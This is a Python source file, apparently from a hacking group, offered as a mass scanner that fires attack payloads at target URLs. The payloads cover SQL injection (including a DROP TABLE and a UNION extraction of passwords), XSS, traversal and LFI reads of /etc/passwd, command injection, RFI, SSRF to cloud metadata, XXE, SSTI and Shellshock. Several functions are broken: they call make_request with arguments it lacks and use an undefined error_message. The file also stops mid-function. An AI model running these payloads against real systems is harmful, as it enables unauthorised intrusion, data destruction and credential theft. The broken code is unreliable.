##########################################
# -*- coding: utf-8 -*-  # Define the encoding of the script          #
# usr/bin/env/python  # Specify the interpreter for the script        #
# Err0r_HB  # Author information                                                #
# Cyb3r Drag0nz Team / ByteBlitz  # Team information                #
# Release Date: 19/07/2024 # Release date of the script              #
# Language: Python3  # Programming language used                    #
# Telegram: https:/t.me/hacking1337stuff  # Contact information #
# Pourpose: Mass Vulnerability Scanner  # Purpose of the script  #
##########################################

"""
 *
 * Copyright (C) - All Rights Reserved
 * Unauthorized copying of this file, via any medium is strictly prohibited
 * Proprietary and confidential
 * Written by Err0r_HB <errorbb@protonmail.com>
 * Member and Co-Founder of Cyber Drag0nz / ByteBlitz Team
 *
 """

import os  # Importing os to handle file and directory operations
import re  # Import the 're' module for regular expressions
import requests  # Importing the requests library to make HTTP requests
import argparse  # Importing argparse to handle command-line arguments
import threading  # Importing threading to handle multi-threading
import queue  # Importing queue to manage a queue of URLs
from datetime import datetime  # Importing datetime to handle date and time
import urllib3  # Importing urllib3 to handle HTTP requests

# Initialize global counters
total_scans = 0
vulnerabilities_found = 0    

# Disabling SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize global counters
total_scans = 0
vulnerabilities_found = 0    

if os.name == "nt":
    os.system("cls")  # Clear the screen for Windows OS
else:
    os.system("clear")  # Clear the screen for Unix-like OS
    os.system("color a")  # Set the green colour


# Function to print the banner
def banner():
    print(
        f"""
\033[1;92m█\033[1;92m█\033[1;93m╗\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[1;92m█\033[1;92m█\033[1;93m╗\033[1;92m█\033[1;92m█\033[1;93m╗\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[1;92m█\033[1;92m█\033[1;93m╗\033[1;92m█\033[1;92m█\033[1;93m╗\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[1;92m█\033[1;92m█\033[1;92m█\033[1;93m╗\033[38;5;029m░\033[38;5;029m░\033[1;92m█\033[1;92m█\033[1;93m╗\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;93m╗\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;93m╗\033[38;5;029m░
\033[1;92m█\033[1;92m█\033[1;93m║\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[1;92m█\033[1;92m█\033[1;93m║\033[1;92m█\033[1;92m█\033[1;93m║\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[1;92m█\033[1;92m█\033[1;93m║\033[1;92m█\033[1;92m█\033[1;93m║\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;93m╗\033[38;5;029m░\033[1;92m█\033[1;92m█\033[1;93m║\033[1;92m█\033[1;92m█\033[1;93m╔════╝\033[1;92m█\033[1;92m█\033[1;93m╔══\033[1;92m█\033[1;92m█\033[1;93m╗
\033[1;93m╚\033[1;92m█\033[1;92m█\033[1;93m╗\033[38;5;029m░\033[1;92m█\033[1;92m█\033[1;93m╔╝\033[1;92m█\033[1;92m█\033[1;93m║\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[1;92m█\033[1;92m█\033[1;93m║\033[1;92m█\033[1;92m█\033[1;93m║\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[1;92m█\033[1;92m█\033[1;93m╔\033[1;92m█\033[1;92m█\033[1;93m╗\033[1;92m█\033[1;92m█\033[1;93m║\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;93m╗\033[38;5;029m░\033[38;5;029m░\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;93m╔╝
\033[38;5;029m░\033[1;93m╚\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;93m╔╝\033[38;5;029m░\033[1;92m█\033[1;92m█\033[1;93m║\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[1;92m█\033[1;92m█\033[1;93m║\033[1;92m█\033[1;92m█\033[1;93m║\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[1;92m█\033[1;92m█\033[1;93m║╚\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;93m║\033[1;92m█\033[1;92m█\033[1;93m╔══╝\033[38;5;029m░\033[38;5;029m░\033[1;92m█\033[1;92m█\033[1;93m╔══\033[1;92m█\033[1;92m█\033[1;93m╗
\033[38;5;029m░\033[38;5;029m░\033[1;93m╚\033[1;92m█\033[1;92m█\033[1;93m╔╝\033[38;5;029m░\033[38;5;029m░\033[1;93m╚\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;93m╔╝\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;93m╗\033[1;92m█\033[1;92m█\033[1;93m║\033[38;5;029m░\033[1;93m╚\033[1;92m█\033[1;92m█\033[1;92m█\033[1;93m║\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;92m█\033[1;93m╗\033[1;92m█\033[1;92m█\033[1;93m║\033[38;5;029m░\033[38;5;029m░\033[1;92m█\033[1;92m█\033[1;93m║
\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[1;93m╚═╝\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[38;5;029m░\033[1;93m╚═════╝\033[38;5;029m░\033[1;93m╚══════╝╚═╝\033[38;5;029m░\033[38;5;029m░\033[1;93m╚══╝╚══════╝╚═╝\033[38;5;029m░\033[38;5;029m░\033[1;93m╚═╝
  \033[48;5;21;38;5;10mPoC Mass Scanner for Multiple Vulnerabilities\033[0m
"""
    )


# Defining constants for log directory and files
LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "log.txt")
SUCCESS_FILE = os.path.join(LOG_DIR, "success.txt")


# Function to create log directory if it doesn't exist
def create_log_dir():
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)
        print_message("info", f"Log directory created: {LOG_DIR}")


# Function to log messages to a file
def log_message(message):
    with open(LOG_FILE, "a") as log_file:
        log_file.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")


# Function to log success messages to a file
def success_message(message):
    with open(SUCCESS_FILE, "a") as success_file:
        success_file.write(
            f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {message}\n"
        )


# Function to print messages to the console with color coding
def print_message(level, message):
    colors = {
        "info": "\033[1;94m",
        "success": "\033[1;92m",
        "warning": "\033[1;93m",
        "error": "\033[1;91m",
        "vulnerable": "\033[1;96m",
        "listing": "\033[1;93m",
    }
    reset_color = "\033[0m"
    colored_message = f"{colors[level]}[{level.upper()}] {message}{reset_color}"
    print(colored_message)

    # Remove ANSI color codes for logging
    plain_message = re.sub(r"\033\[\d+(;\d+)*m", "", message)
    log_message(f"[{level.upper()}] {plain_message}")


# Example usage
create_log_dir()
print_message("info", "This is an info message.")
print_message("success", "This is a success message.")
print_message("warning", "This is a warning message.")
print_message("error", "This is an error message.")
print_message("vulnerable", "This is a vulnerable message.")
print_message("listing", "This is a listing message.")


# Function to make HTTP requests
def make_request(url):
    # Try to make a GET request to the provided URL
    try:
        response = requests.get(
            url, verify=False
        )  # Disable SSL verification for simplicity
        return (
            response.text,
            response.status_code,
        )  # Return the response text and status code
    except requests.RequestException as e:  # Catch any request exceptions
        return None, None  # Return None for both response text and status code


# Function to test for SQL Injection vulnerability
def test_sql_injection(url):
    # Define a list of sophisticated SQL injection payloads
    payloads = [
        "%27",  # URL encoded single quote
        "' OR '1'='1",  # Basic tautology
        "'; DROP TABLE users--",  # SQL command injection
        "' UNION SELECT null, username, password FROM users--",  # Union-based injection
        "' OR 'x'='x",  # Another tautology
        "' OR 'x'='y",  # False condition
        "' OR 1=1--",  # Another basic tautology
        "' OR 1=1#",  # Tautology with comment
        "' OR 1=1/*",  # Tautology with multi-line comment
        "' OR SLEEP(5)--",  # Time-based injection
        "' OR BENCHMARK(1000000,MD5(1))--",  # Time-based injection with benchmark
    ]

    # Patterns that indicate successful SQL injection
    success_patterns = [
        "you have an error in your sql syntax",
        "syntax error",
        "unclosed quotation mark",
        "mysql_fetch_array()",
        "unexpected end of sql command",
        "sql syntax",
        "warning: mysql",
        "unrecognized token",
        "quoted string not properly terminated",
    ]

    for payload in payloads:
        full_url = f"{url}/?id={payload}"  # Construct the full URL with the payload
        try:
            response = requests.get(
                full_url, timeout=10
            )  # Make a request to the full URL with a timeout
            body = (
                response.text.lower()
            )  # Convert response body to lowercase for case-insensitive comparison
            status = response.status_code
            response_time = response.elapsed.total_seconds()  # Get the response time

            # Check if the response body contains any of the success patterns
            if any(pattern in body for pattern in success_patterns):
                continue  # Skip to the next payload if a syntax error is detected

            # Check for specific indicators of successful injection
            if "error" not in body and status == 200:
                success_message(
                    f"SQL Injection Vulnerable: {url}"
                )  # Print success message
                return True  # Return True indicating vulnerability

            # Check for time-based SQL injection
            if response_time > 5:
                success_message(
                    f"Possible Time-based SQL Injection Vulnerable: {url}"
                )  # Print success message
                return True  # Return True indicating vulnerability
        except requests.RequestException as e:
            print(f"Request failed: {e}")
            continue  # Skip to the next payload if a request error occurs

    return False  # Return False indicating no vulnerability


# Function to test for XSS vulnerability
def test_xss(url):
    # Define a list of sophisticated XSS payloads
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<a href=\"javascript:alert('XSS')\">click me</a>",
        "<svg/onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        '<input type="text" value="" onfocus="alert(\'XSS\')">',
        '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
        "<div style=\"width: expression(alert('XSS'));\"></div>",
        "<object data=\"javascript:alert('XSS')\"></object>",
    ]

    # Define a list of query parameters to test
    query_params = ["q", "search", "id", "page", "input"]

    for payload in payloads:
        for param in query_params:
            full_url = (
                f"{url}?{param}={payload}"  # Construct the full URL with the payload
            )
            body, status = make_request(full_url)  # Make a request to the full URL

            if status != 200:  # Skip further checks if the status is not 200
                continue

            # Check if the response body contains the payload or typical XSS indicators
            if body:
                # Check for the exact payload in the response body
                if payload in body:
                    success_message(
                        f"XSS Vulnerable: {url} with payload: {payload}"
                    )  # Print success message
                    return True  # Return True indicating vulnerability

                # Check for common XSS indicators in the response body
                if re.search(
                    r"onerror=|javascript:|onload=|expression\(|src=javascript:|data=javascript:",
                    body,
                    re.IGNORECASE,
                ):
                    success_message(
                        f"XSS Vulnerable: {url} with payload: {payload}"
                    )  # Print success message
                    return True  # Return True indicating vulnerability

    return False  # Return False indicating no vulnerability


# Function to test for Path Traversal vulnerability
def test_path_traversal(url):
    # Define a list of common path traversal payloads
    payloads = [
        "/../../../../etc/passwd",
        "/../../../../../etc/passwd",
        "/../../../../../../etc/passwd",
        "/../../../../../../../etc/passwd",
    ]

    # Initialize a flag to track if any payload is successful
    is_vulnerable = False

    # Iterate over each payload to test the URL
    for payload in payloads:
        full_url = f"{url}{payload}"  # Construct the full URL with the payload
        body, status = make_request(full_url)  # Make a request to the full URL

        # Check if the response body contains the root user entry
        if body and "root:x" in body:
            success_message(
                f"Path Traversal Vulnerable: {url}"
            )  # Print success message
            is_vulnerable = True  # Set the flag to True indicating vulnerability
            break  # Exit the loop as we found a successful payload

    return is_vulnerable  # Return the flag indicating vulnerability


# Function to test for Directory Listing vulnerability
def test_directory_listing(url):
    body, status = make_request(url)  # Make a request to the provided URL

    # Check if the response status indicates a successful request
    if status != 200:
        return (
            False  # Return False indicating no vulnerability if the status is not 200
        )

    # Check if the response body indicates directory listing
    # Improved checks to reduce false positives
    if body and (
        "Index of /" in body
        or "Directory listing for" in body
        or "<title>Index of" in body
        or "<h1>Directory Listing</h1>" in body
    ):
        success_message(f"Directory Listing Enabled: {url}")  # Print success message
        return True  # Return True indicating vulnerability

    return False  # Return False indicating no vulnerability


# Function to test for Command Injection vulnerability
def test_command_injection(url):
    # Define a list of command injection payloads to test
    payloads = [
        "; ls",  # Simple command injection payload
        "| ls",  # Alternative command injection payload using pipe
        "$(ls)",  # Command injection payload using command substitution
        "`ls`",  # Command injection payload using backticks
    ]

    # Define a list of common directory names to look for in the response body
    common_directories = ["bin", "etc", "tmp", "var"]

    # Iterate over each payload to test for command injection
    for payload in payloads:
        full_url = (
            f"{url}?cmd={payload}"  # Construct the full URL with the current payload
        )
        body, status = make_request(full_url)  # Make a request to the full URL

        # Check if the response body contains any of the common directory names
        if body:
            for directory in common_directories:
                if directory in body:
                    success_message(
                        f"Command Injection Vulnerable: {url}"
                    )  # Print success message
                    return True  # Return True indicating vulnerability

    return False  # Return False indicating no vulnerability


def test_lfi(url):
    # List of common LFI payloads to test
    payloads = [
        "/etc/passwd",
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "/proc/self/environ",
        "/proc/version",
        "/proc/cmdline",
    ]

    # Iterate over each payload to test for LFI
    for payload in payloads:
        full_url = f"{url}?file={payload}"  # Construct the full URL with the payload
        try:
            body, status = make_request(full_url)  # Make a request to the full URL
            if (
                status == 200 and body
            ):  # Check if the response status is 200 and body is not empty
                # Check for common LFI indicators in the response body
                if "root:x" in body or "Linux version" in body or "PATH=" in body:
                    success_message(
                        f"LFI Vulnerable: {url} with payload {payload}"
                    )  # Print success message
                    return True  # Return True indicating vulnerability
        except Exception as e:
            # Log any errors encountered (assuming a log_message function exists)
            log_message(f"Error testing {full_url}: {e}")

    return False  # Return False indicating no vulnerability


def test_rfi(url):
    # Define multiple RFI payloads to test
    payloads = [
        "http://example.com/shell.txt",
        "http://test.com/malicious.php",
        "http://malicious.com/exploit.txt",
    ]

    # Define custom headers to mimic a real browser request
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Connection": "keep-alive",
    }

    # Iterate over each payload
    for payload in payloads:
        full_url = f"{url}?file={payload}"  # Construct the full URL with the payload
        try:
            # Make a request to the full URL with a timeout and custom headers
            response = make_request(full_url, headers=headers, timeout=10)
            body, status = response  # Unpack the response tuple

            # Check if the response body contains specific patterns indicating RFI
            if body and ("shell" in body or "malicious" in body or "exploit" in body):
                success_message(
                    f"RFI Vulnerable: {url} with payload {payload}"
                )  # Print success message
                return True  # Return True indicating vulnerability
        except Exception as e:
            # Handle any exceptions that occur during the request
            log_message(f"Request failed for {full_url}: {e}")

    # If no payloads indicate vulnerability, return False
    return False  # Return False indicating no vulnerability


# Function to test for File Upload vulnerability
def test_file_upload(url):
    # Define multiple test files for upload
    test_files = [
        ("test.txt", "This is a test file"),
        ("test.php", "<?php echo 'test'; ?>"),
        ("test.html", "<html><body>Test</body></html>"),
    ]

    # Define custom headers to mimic a real browser request
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Connection": "keep-alive",
    }

    # Iterate over each test file
    for filename, content in test_files:
        files = {"file": (filename, content)}  # Define the file to be uploaded
        try:
            # Make a POST request to upload the file with custom headers
            response = requests.post(
                url, files=files, headers=headers, verify=False, timeout=10
            )

            # Check if the file was uploaded successfully
            if response.status_code == 200 and "file uploaded" in response.text.lower():
                success_message(
                    f"File Upload Vulnerable: {url} with file {filename}"
                )  # Print success message
                return True  # Return True indicating vulnerability
        except requests.RequestException as e:
            # Handle any request exceptions
            log_message(f"Request failed for {url} with file {filename}: {e}")

    # If no files indicate vulnerability, return False
    return False  # Return False indicating no vulnerability


# Function to test for Open Redirect vulnerability
def test_open_redirect(url):
    # Define multiple open redirect payloads
    payloads = [
        "/redirect?url=http://malicious.com",
        "/redirect?next=http://malicious.com",
        "/redirect?target=http://malicious.com",
        "/redirect?dest=http://malicious.com",
    ]

    # Define custom headers to mimic a real browser request
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Connection": "keep-alive",
    }

    # Iterate over each payload
    for payload in payloads:
        full_url = f"{url}{payload}"  # Construct the full URL with the payload
        try:
            # Make a GET request to the full URL with custom headers
            response = requests.get(
                full_url,
                headers=headers,
                allow_redirects=False,
                verify=False,
                timeout=10,
            )

            # Check if the response status code indicates a redirect and the location header contains the malicious URL
            if (
                response.status_code in [301, 302]
                and "location" in response.headers
                and "malicious.com" in response.headers["location"]
            ):
                success_message(
                    f"Open Redirect Vulnerable: {url} with payload {payload}"
                )  # Print success message
                return True  # Return True indicating vulnerability
        except requests.RequestException as e:
            # Handle any request exceptions
            log_message(f"Request failed for {full_url}: {e}")

    # If no payloads indicate vulnerability, return False
    return False  # Return False indicating no vulnerability


# Function to test for Cross-Site Request Forgery (CSRF) vulnerability
def test_csrf(url):
    # Define multiple CSRF payloads
    payloads = [
        '<html><body><form action="{}" method="POST"><input type="hidden" name="csrf" value=""><input type="submit"></form></body></html>'.format(
            url
        ),
        '<html><body><form action="{}" method="POST"><input type="hidden" name="token" value=""><input type="submit"></form></body></html>'.format(
            url
        ),
        '<html><body><form action="{}" method="POST"><input type="hidden" name="authenticity_token" value=""><input type="submit"></form></body></html>'.format(
            url
        ),
    ]

    # Define custom headers to mimic a real browser request
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Content-Type": "text/html",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Connection": "keep-alive",
    }

    # Iterate over each payload
    for payload in payloads:
        try:
            # Make a POST request with the CSRF payload and custom headers
            response = requests.post(
                url, data=payload, headers=headers, verify=False, timeout=10
            )

            # Check if the response status code is 200 and the response text does not indicate a missing CSRF token
            if (
                response.status_code == 200
                and "csrf token missing" not in response.text.lower()
            ):
                success_message(
                    f"CSRF Vulnerable: {url} with payload {payload}"
                )  # Print success message
                return True  # Return True indicating vulnerability
        except requests.RequestException as e:
            # Handle any request exceptions
            log_message(f"Request failed for {url} with payload {payload}: {e}")

    # If no payloads indicate vulnerability, return False
    return False  # Return False indicating no vulnerability


# Function to test for CRLF Injection vulnerability
def test_crlf(url):
    payload = (
        "%0D%0ASet-Cookie:mycookie=myvalue"  # Define a simple CRLF injection payload
    )
    full_url = f"{url}?q={payload}"  # Construct the full URL with the payload
    try:
        response = requests.get(
            full_url, verify=False
        )  # Make a GET request to the full URL
        if "mycookie=myvalue" in response.headers.get(
            "Set-Cookie", ""
        ):  # Check if the response headers contain the injected cookie
            success_message(
                f"CRLF Injection Vulnerable: {url}"
            )  # Print success message
            return True  # Return True indicating vulnerability
    except requests.RequestException as e:  # Catch any request exceptions
        return False  # Return False indicating no vulnerability
    return False  # Return False indicating no vulnerability


# Function to test for Client-Side Template Injection (CSTI) vulnerability
def test_csti(url):
    # List of CSTI payloads to test
    payloads = [
        "{{7*7}}",  # Simple arithmetic payload
        "{{7*'7'}}",  # String multiplication payload
        "{{7*'7'|length}}",  # String length payload
        "{{7*7*7}}",  # More complex arithmetic payload
        "{{7*7*7*7}}",  # Even more complex arithmetic payload
    ]

    # Expected results for the payloads
    expected_results = ["49", "7777777", "7", "343", "2401"]

    # Iterate over each payload
    for payload, expected in zip(payloads, expected_results):
        full_url = f"{url}?input={payload}"  # Construct the full URL with the payload
        try:
            body, status = make_request(
                full_url, timeout=5
            )  # Make a request with a timeout
        except Exception as e:
            log_message(f"Error making request to {full_url}: {e}")  # Log the error
            continue  # Skip to the next payload

        # Check if the response body contains the expected result of the CSTI payload
        if body and expected in body:
            success_message(
                f"CSTI Vulnerable: {url} with payload {payload}"
            )  # Print success message
            return True  # Return True indicating vulnerability

    return False  # Return False indicating no vulnerability


# Function to test for Server-Side Request Forgery (SSRF) vulnerability
def test_ssrf(url):
    # List of SSRF payloads to test
    payloads = [
        "http://localhost/server-status",
        "http://127.0.0.1/server-status",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]/server-status",
        "http://0.0.0.0/server-status",
    ]

    # Iterate over each payload
    for payload in payloads:
        full_url = f"{url}?url={payload}"  # Construct the full URL with the payload
        try:
            body, status = make_request(
                full_url, timeout=5
            )  # Make a request with a timeout
        except Exception as e:
            log_message(f"Error making request to {full_url}: {e}")  # Log the error
            continue  # Skip to the next payload

        # Check if the response body contains indicators of SSRF vulnerability
        if body and ("Server Status" in body or "meta-data" in body):
            success_message(
                f"SSRF Vulnerable: {url} with payload {payload}"
            )  # Print success message
            return True  # Return True indicating vulnerability

    return False  # Return False indicating no vulnerability


# Function to test for XML External Entity (XXE) vulnerability
def test_xxe(url):
    payloads = [
        """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
        """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>""",
        """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>""",
    ]

    headers = {"Content-Type": "application/xml"}  # Define the content type header

    for payload in payloads:
        try:
            response = make_request(
                url, data=payload, headers=headers, method="POST", timeout=5
            )  # Make a POST request with the XXE payload
        except Exception as e:  # Catch any request exceptions
            log_message(
                f"Error making request to {url} with payload: {e}"
            )  # Log the error
            continue  # Skip to the next payload

        # Check if the response text contains indicators of XXE vulnerability
        if (
            "root:x" in response.text
            or "127.0.0.1" in response.text
            or "PATH=" in response.text
        ):
            success_message(
                f"XXE Vulnerable: {url} with payload {payload}"
            )  # Print success message
            return True  # Return True indicating vulnerability

    return False  # Return False indicating no vulnerability


# Function to test for Server-Side Template Injection (SSTI) vulnerability
def test_ssti(url):
    # Define a list of SSTI payloads to test
    payloads = [
        "{{7*7}}",  # Jinja2
        "${{7*7}}",  # Velocity
        "#{7*7}",  # Thymeleaf
        "<%= 7*7 %>",  # JSP
        "#{7*7}",  # Freemarker
        "${{7*7}}",  # Spring
        "{{7*'7'}}",  # Jinja2 string multiplication
        "${{7*'7'}}",  # Velocity string multiplication
    ]

    # Expected results for the payloads
    expected_results = [
        "49",  # Result of 7*7
        "7777777",  # Result of 7*'7'
    ]

    for payload in payloads:
        full_url = f"{url}?input={payload}"  # Construct the full URL with the payload
        body, status = make_request(full_url)  # Make a request to the full URL

        if body:
            for result in expected_results:
                if (
                    result in body
                ):  # Check if the response body contains the expected result
                    success_message(
                        f"SSTI Vulnerable: {url} with payload {payload}"
                    )  # Print success message
                    return True  # Return True indicating vulnerability

    return False  # Return False indicating no vulnerability


# Function to test for HTTP Header Injection vulnerability
def test_http_header_injection(url):
    # Define a list of HTTP header injection payloads to test
    payloads = [
        "User-Agent: () { :;}; echo; echo; /bin/bash -c 'cat /etc/passwd'",  # Shellshock
        "User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'",  # Shellshock variant
        "User-Agent: () { :;}; /bin/bash -c 'echo vulnerable'",  # Simple echo test
        "User-Agent: () { :;}; /bin/bash -c 'id'",  # Check for user id
        "User-Agent: () { :;}; /bin/bash -c 'uname -a'",  # Check for system info
    ]

    # Expected results for the payloads
    expected_results = [
        "root:x",  # Indicator of /etc/passwd content
        "vulnerable",  # Indicator of simple echo test
        "uid=",  # Indicator of user id
        "Linux",  # Indicator of system info
    ]

    for payload in payloads:
        headers = {
            "User-Agent": payload
        }  # Define the user agent header with the payload
        try:
            response = requests.get(
                url, headers=headers, verify=False
            )  # Make a GET request with the injected header

            if response.text:
                for result in expected_results:
                    if (
                        result in response.text
                    ):  # Check if the response text contains any expected result
                        success_message(
                            f"HTTP Header Injection Vulnerable: {url} with payload {payload}"
                        )  # Print success message
                        return True  # Return True indicating vulnerability
        except requests.RequestException as e:  # Catch any request exceptions
            continue  # Continue to the next payload if an exception occurs

    return False  # Return False indicating no vulnerability


def test_subdomain_takeover(url):
    # Define a list of indicators for subdomain takeover
    indicators = [
        "There isn't a GitHub Pages site here.",  # GitHub Pages
        "The specified bucket does not exist",  # Amazon S3
        "NoSuchBucket",  # Amazon S3
        "You're almost there!",  # Heroku
        "This is a placeholder for the subdomain",  # Pantheon
        "Domain not found",  # Tumblr
        "Sorry, this shop is currently unavailable.",  # Shopify
        "Do you want to register",  # WordPress
        "No such app",  # Heroku
        "No settings were found for this company",  # Desk
        "Fastly error: unknown domain",  # Fastly
        "The feed has not been found.",  # FeedPress
        "The thing you were looking for is no longer here",  # Ghost
        "The request could not be satisfied",  # CloudFront
        "No such site at this address",  # Fly.io
        "No such site",  # Fly.io
        "No such app",  # Heroku
        "No such site",  # Netlify
        "No such site",  # Surge.sh
        "No such site",  # Vercel
    ]

    try:
        response = requests.get(
            url, verify=False
        )  # Make a GET request to the provided URL

        if response.text:
            for indicator in indicators:
                if (
                    indicator in response.text
                ):  # Check if the response text contains any indicator
                    success_message(
                        f"Subdomain Takeover Vulnerable: {url} with indicator '{indicator}'"
                    )  # Print success message
                    return True  # Return True indicating vulnerability
    except requests.RequestException as e:  # Catch any request exceptions
        return False  # Return False indicating no vulnerability

    return False  # Return False indicating no vulnerability


# Function to test for Insecure Deserialization vulnerability
def test_insecure_deserialization(url):
    # Define a list of insecure deserialization payloads
    payloads = [
        '{"username":"admin","password":"admin"}',
        '{"user":"admin","pass":"admin"}',
        '{"user":"admin","password":"admin"}',
        '{"username":"admin","pass":"admin"}',
        '{"role":"admin","access":"full"}',
    ]

    headers = {"Content-Type": "application/json"}  # Define the content type header

    for payload in payloads:  # Iterate over each payload
        try:
            response = requests.post(
                url, data=payload, headers=headers, verify=False, timeout=5
            )  # Make a POST request with the deserialization payload and a timeout

            # Check if the response text contains any indication of successful deserialization
            if any(
                keyword in response.text for keyword in ["admin", "full access", "role"]
            ):
                success_message(
                    f"Insecure Deserialization Vulnerable: {url} with payload: {payload}"
                )  # Print success message with the specific payload
                return True  # Return True indicating vulnerability

        except requests.RequestException as e:  # Catch any request exceptions
            error_message(
                f"Request failed for {url} with payload: {payload}. Error: {e}"
            )
            continue  # Continue to the next payload if an exception occurs

    return False  # Return False indicating no vulnerability


def test_http_parameter_pollution(url):
    """
    Test for HTTP Parameter Pollution (HPP) vulnerability.

    Args:
        url (str): The URL to test for HPP vulnerability.

    Returns:
        bool: True if the URL is vulnerable, False otherwise.
    """
    # Define a list of payloads with duplicate parameter names
    payloads = [
        "param1=value1&param1=value2",
        "param2=test&param2=exploit",
        "param3=foo&param3=bar",
        "param4=123&param4=456",
        "param5=abc&param5=def",
    ]

    for payload in payloads:  # Iterate over each payload
        full_url = f"{url}?{payload}"  # Construct the full URL with the payload
        try:
            body, status = make_request(
                full_url
            )  # Make a request to the full URL and get the response body and status

            # Check if the response body contains the second value of the duplicated parameter
            if body and any(
                value in body for value in ["value2", "exploit", "bar", "456", "def"]
            ):
                success_message(
                    f"HTTP Parameter Pollution Vulnerable: {url} with payload: {payload}"
                )  # Print a success message if the URL is vulnerable with the specific payload
                return True  # Return True indicating the vulnerability

        except Exception as e:  # Catch any exceptions
            error_message(
                f"Request failed for {url} with payload: {payload}. Error: {e}"
            )
            continue  # Continue to the next payload if an exception occurs

    return False  # Return False if the URL is not vulnerable


def test_host_header_injection(url):
    """
    Test for Host Header Injection vulnerability.

    Args:
        url (str): The URL to test.

    Returns:
        bool: True if the URL is vulnerable, False otherwise.
    """
    # List of payloads to test for Host Header Injection
    payloads = [
        "malicious.com",
        "evil.com",
        "attacker.com",
        "localhost",
        "127.0.0.1",
        "0.0.0.0",
        "example.com",
    ]

    # Iterate over each payload to test for vulnerability
    for payload in payloads:
        headers = {"Host": payload}  # Set the Host header to the current payload
        try:
            # Make a request to the URL with the modified headers
            response = requests.get(url, headers=headers, verify=False, timeout=5)

            # Check if the response text contains the malicious host
            if payload in response.text:
                success_message(
                    f"Host Header Injection Vulnerable: {url} with payload: {payload}"
                )
                return True  # Return True indicating the vulnerability
        except requests.RequestException as e:
            # Log the exception for debugging purposes
            error_message(
                f"Request failed for {url} with payload: {payload}. Exception: {str(e)}"
            )
            continue  # Continue testing with the next payload

    return False  # Return False if the URL is not vulnerable


def test_clickjacking(url):
    """
    Test for Clickjacking vulnerability.

    Args:
        url (str): The URL to test.

    Returns:
        bool: True if the URL is vulnerable, False otherwise.
    """
    # Headers to check for Clickjacking protection
    protection_headers = ["X-Frame-Options", "Content-Security-Policy"]

    try:
        # Make a request to the URL
        response = requests.get(url, verify=False, timeout=5)

        # Check if any of the protection headers are present in the response
        for header in protection_headers:
            if header in response.headers:
                # Check for specific directives in Content-Security-Policy
                if header == "Content-Security-Policy":
                    csp = response.headers.get("Content-Security-Policy", "")
                    if "frame-ancestors" in csp:
                        return False  # Return False if frame-ancestors directive is present

                # Check for X-Frame-Options values
                if header == "X-Frame-Options":
